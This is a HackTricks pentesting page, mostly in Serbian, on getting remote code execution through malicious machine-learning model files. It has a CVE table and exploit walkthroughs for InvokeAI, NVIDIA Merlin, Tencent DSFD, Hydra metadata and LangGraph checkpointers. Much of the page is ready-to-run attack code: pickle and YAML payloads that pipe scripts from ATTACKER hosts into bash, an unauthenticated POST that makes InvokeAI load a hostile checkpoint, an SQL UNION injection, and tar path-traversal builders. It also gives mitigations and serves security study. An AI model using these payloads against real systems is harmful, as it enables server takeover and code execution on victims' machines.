# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning modeli se obično dele u različitim formatima, kao što su ONNX, TensorFlow, PyTorch, itd. Ovi modeli mogu biti učitani na developer mašinama ili production sistemima da bi se koristili. Obično modeli ne bi trebalo da sadrže malicious code, ali postoje slučajevi kada model može da se iskoristi za izvršavanje arbitrary code na sistemu, bilo kao namerna feature ili zbog vulnerability u model loading biblioteci.

U vreme pisanja, ovo su neki primeri ovog tipa vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Štaviše, postoje neki python pickle based modeli kao što su oni koje koristi [PyTorch](https://github.com/pytorch/pytorch/security) koji mogu da se iskoriste za izvršavanje arbitrary code na sistemu ako se ne učitavaju sa `weights_only=True`. Dakle, bilo koji pickle based model može biti posebno podložan ovakvim attacks, čak i ako nisu navedeni u tabeli iznad.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` importuje i poziva bilo koji dotted `_target_` u configuration/metadata objektu. Kada biblioteke prosleđuju **untrusted model metadata** u `instantiate()`, attacker može da supply-je callable i argumente koji se odmah izvršavaju tokom model load-a (nije potreban pickle).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Ključne tačke:
- Okida se pre inicijalizacije modela u NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coderima i FlexTok loaderima.
- Hydra-ina string block-lista može da se zaobiđe preko alternativnih import path-ova (npr. `enum.bltns.eval`) ili application-resolved imena (npr. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok takođe parsira metadata zapisana kao string sa `ast.literal_eval`, što omogućava DoS (CPU/memory blowup) pre Hydra poziva.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` je popularan open-source web interface za Stable-Diffusion. Verzije **5.3.1 – 5.4.2** izlažu REST endpoint `/api/v2/models/install` koji omogućava korisnicima da preuzmu i učitaju modele sa proizvoljnih URL-ova.

Interno, endpoint na kraju poziva:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Kada je dostavljeni fajl **PyTorch checkpoint (`*.ckpt`)**, `torch.load` izvršava **pickle deserialization**. Pošto sadržaj dolazi direktno iz URL-a pod kontrolom korisnika, napadač može ubaciti zlonamerni objekat sa prilagođenim `__reduce__` metodom unutar checkpoint-a; metod se izvršava **tokom deserialization**, što dovodi do **remote code execution (RCE)** na InvokeAI serveru.

Ranjivost je dodeljena kao **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Kreiraj zlonamerni checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Host `payload.ckpt` na HTTP serveru koji kontrolišeš (npr. `http://ATTACKER/payload.ckpt`).
3. Okini ranjivu endpointu (nije potrebna autentikacija):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Kada InvokeAI preuzme fajl, poziva `torch.load()` → `os.system` gadget se izvršava i napadač dobija code execution u kontekstu InvokeAI procesa.

Gotov exploit: **Metasploit** modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo tok.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` dostupan napadaču  
•  Proces ima dozvole za izvršavanje shell komandi

#### Mitigations

* Nadogradi na **InvokeAI ≥ 5.4.3** – patch postavlja `scan=True` podrazumevano i vrši malware scanning pre deserialization.
* Kada programatski učitavaš checkpoint-e koristi `torch.load(file, weights_only=True)` ili novi [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Primeni allow-lists / signatures za izvore modela i pokreći servis sa least-privilege.

> ⚠️ Zapamti da je **svaki** Python pickle-based format (uključujući mnoge `.pt`, `.pkl`, `.ckpt`, `.pth` fajlove) inherentno nesiguran za deserialization iz nepouzdanih izvora.

---

Primer ad-hoc mitigacije ako moraš da zadržiš starije InvokeAI verzije iza reverse proxy-ja:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE preko unsafe `torch.load` (CVE-2025-23298)

NVIDIA-ov Transformers4Rec (deo Merlina) je izložio unsafe loader za checkpoint-ove koji je direktno pozivao `torch.load()` nad putanjama koje je obezbedio korisnik. Pošto `torch.load` zavisi od Python `pickle`, checkpoint pod kontrolom napadača može da izvrši proizvoljan code preko reducer-a tokom deserializacije.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Zašto ovo vodi do RCE: U Python pickle-u, objekat može da definiše reducer (`__reduce__`/`__setstate__`) koji vraća callable i argumente. Taj callable se izvršava tokom unpickling-a. Ako je takav objekat prisutan u checkpoint-u, on se pokreće pre nego što se bilo koji weights koriste.

Minimalni malicious checkpoint primer:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vektori isporuke i blast radius:
- Trojanizovani checkpoints/models deljeni preko repos, buckets, ili artifact registrija
- Automatski resume/deploy pipelines koji auto-load checkpoints
- Izvršavanje se dešava unutar training/inference workers, često sa povišenim privilegijama (npr. root u containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zamenio je direktni `torch.load()` sa restricted, allow-listed deserializer implementiranim u `transformers4rec/utils/serialization.py`. Novi loader validira types/fields i sprečava da se arbitrary callables pozivaju tokom load.

Defensive guidance specific to PyTorch checkpoints:
- Ne unpickle-uj untrusted data. Preferiraj non-executable formate kao [Safetensors](https://huggingface.co/docs/safetensors/index) ili ONNX kada je moguće.
- Ako moraš da koristiš PyTorch serialization, obezbedi `weights_only=True` (supported in newer PyTorch) ili koristi custom allow-listed unpickler sličan Transformers4Rec patch-u.
- Enforce model provenance/signatures i sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS i no network egress).
- Monitor za unexpected child processes iz ML services pri checkpoint load time; trace `torch.load()`/`pickle` usage.

POC i vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Učitaj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent-ov FaceDetection-DSFD izlaže `resnet` endpoint koji deserializuje podatke pod kontrolom korisnika. ZDI je potvrdio da udaljeni napadač može naterati žrtvu da učita zlonamernu stranicu/fajl, navede je da pošalje posebno pripremljen serialized blob na taj endpoint i pokrene deserialization kao `root`, što vodi do potpunog compromise-a.

Tok eksploatacije prati tipičan pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Bilo koji gadget dostupan tokom deserializacije (constructors, `__setstate__`, framework callbacks, itd.) može se iskoristiti na isti način, bez obzira na to da li je transport bio HTTP, WebSocket, ili fajl ubačen u nadzirani direktorijum.



### LangGraph checkpointer SQLi → MessagePack RCE

Ovaj lanac napada je zanimljiv zato što napadač **ne mora da uploaduje zlonameran model fajl**. Umesto toga, aplikacija izlaže **AI-agent persistence API** (`get_state_history(..., filter=...)`) i user input dospeva do checkpointer query builder-a.

#### 1. Structural SQLi u metadata filterima

Ranjiv SQLite pattern je izgledao ovako:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Vrednost se vezuje kasnije, ali se `query_key` konkatenira u **string JSON putanje**, pa `'` unutar ključa rečnika izlazi iz `'$.{query_key}'` i ubacuje SQL. Ista lekcija važi za **JSON putanje, identifikatore, operatore, `LIMIT`, i TTL polja**: placeholderi štite samo vrednosti, ne i strukturnu sintaksu upita.

#### 2. `UNION SELECT` can target downstream sinks, not just data theft

Upit vraća `type` i serijalizovane `checkpoint` bajtove, koji se kasnije koriste kao:
```python
self.serde.loads_typed((type, checkpoint))
```
To znači da SQLi u `WHERE` klauzuli može da ubaci **lažni red rezultata**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Ako kasniji kod parsira, deserializuje, upisuje ili izvršava bilo koju izabranu kolonu, mapirajte te kolone na njihove sinkove. U ovom slučaju, lažni red pretvara SQLi u **attacker-controlled deserialization**.

#### 3. Unsafe MessagePack extension hooks su ekvivalentni code gadgetima

LangGraph-ov `msgpack` path je koristio custom extension hook koji je raspakivao ugnježdenu tuple i izvršavao:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Dakle, MessagePack extension object encoding koji predstavlja nešto ekvivalentno `("os", "system", "id > /tmp/pwned")` importuje `os`, rešava `system`, i pokreće komandu. Kada pregledate AI framework-ove, proverite **custom MessagePack/JSON/pickle revivers** zbog dynamic imports, reflection, ili arbitrary callable dispatch.

#### 4. Praktični obrazac revizije za agent framework-ove

Pregledajte svaki user-controlled input koji stiže do:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders koji generišu SQL ili Redis query fragmente
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths koji veruju redovima vraćenim iz persistence layer-a

Ovaj konkretan chain je pogodio self-hosted LangGraph deployment-e koristeći **SQLite** ili **Redis** checkpointer-e kada su untrusted users mogli da kontrolišu `filter`. Patch-ovane verzije navedene u disclosure-u bile su `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, i `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

Kao što je pomenuto u [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), većina model formata koje koriste različiti AI framework-ovi zasnovana je na arhivama, obično `.zip`. Zato je moguće zloupotrebiti ove formate za izvođenje path traversal napada, što omogućava čitanje proizvoljnih fajlova sa sistema na kome se model učitava.

Na primer, sa sledećim kodom možete napraviti model koji će, kada se učita, kreirati fajl u `/tmp` direktorijumu:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ili, pomoću sledećeg koda možete kreirati model koji će, kada se učita, napraviti symlink ka `/tmp` direktorijumu:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Dubinski pregled: Keras .keras deserializacija i pronalaženje gadgeta

Za fokusirani vodič o .keras internals, Lambda-layer RCE, arbitrary import problemu u ≤ 3.8, i post-fix otkrivanju gadgeta unutar allowlist, pogledajte:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Reference

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
